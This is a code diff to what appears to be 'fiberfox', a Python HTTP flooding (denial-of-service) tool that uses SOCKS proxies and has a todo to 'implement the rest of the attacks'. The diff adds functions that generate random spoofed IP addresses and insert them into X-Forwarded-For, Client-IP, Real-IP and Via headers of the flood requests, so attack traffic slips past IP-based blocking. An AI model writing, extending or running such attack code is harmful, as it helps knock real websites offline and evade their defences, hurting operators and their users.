@@ -16,11 +16,12 @@ from math import log2, trunc
 from pathlib import Path
 from python_socks import ProxyTimeoutError
 from python_socks.async_.curio import Proxy
-from random import choice, randrange
+from random import choice, randint, randrange
 import re
 import socket as syncsocket
 from sparklines import sparklines
 import string
+from struct import pack
 from tabulate import tabulate
 import time
 from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple, Union
@@ -33,7 +34,7 @@ except ImportError:
     from os import urandom
     randbytes = urandom
 
-# fix issue with thread cancel for Python3.7/8
+# fix issue with pthread_cancel for Python3.7/8
 try:
     import ctypes
     libgcc_s = ctypes.CDLL('libgcc_s.so.1')
@@ -42,7 +43,7 @@ except OSError:
 
 # todo:
 # * keep proxies cache in the file, reload proxies, retry after "dead", "kill switch"
-# * stats: better numbers, on KeyboardInterrupt, list of errors
+# * stats: better numbers, list of errors
 # * implement the rest of the attacks
 # * read referres/useragents from files
 # * run as a package "python -m fiberfox", programmatic launch
@@ -334,6 +335,22 @@ referrers: List[str] = [
 ]
 
 
+def spoof_ip_headers(target: Target) -> List[str]:
+    spoof: str = syncsocket.inet_ntoa(pack('>I', randint(1, 0xffffffff)))
+    return [
+        "X-Forwarded-Proto: http",
+        f"X-Forwarded-Host: {target.url.raw_host}, 1.1.1.1",
+        f"Via: {spoof}",
+        f"Client-IP: {spoof}",
+        f"X-Forwarded-For: {spoof}",
+        f"Real-IP: {spoof}"
+    ]
+
+
+def spoof_ip(target: Target) -> str:
+    return "\r\n".join(spoof_ip_headers(target))
+
+
 # xxx(okachaiev): would be good to have a library to manage encodings only
 def http_req_get(target: Target) -> bytes:
     return (
@@ -341,6 +358,7 @@ def http_req_get(target: Target) -> bytes:
         f"Host: {target.url.authority}\r\n"
         "Accept-Encoding: gzip, deflate\r\n"
         "Accept: */*\r\n"
+        f"{spoof_ip(target)}\r\n"
         "Connection: keep-alive\r\n"
         "\r\n"
     ).encode()
@@ -369,6 +387,7 @@ def http_req_payload(
         "Sec-Fetch-User: 1",
         "Sec-Gpc: 1",
         "Pragma: no-cache",
+        spoof_ip(target)
     ]
     if req:
         parts += req
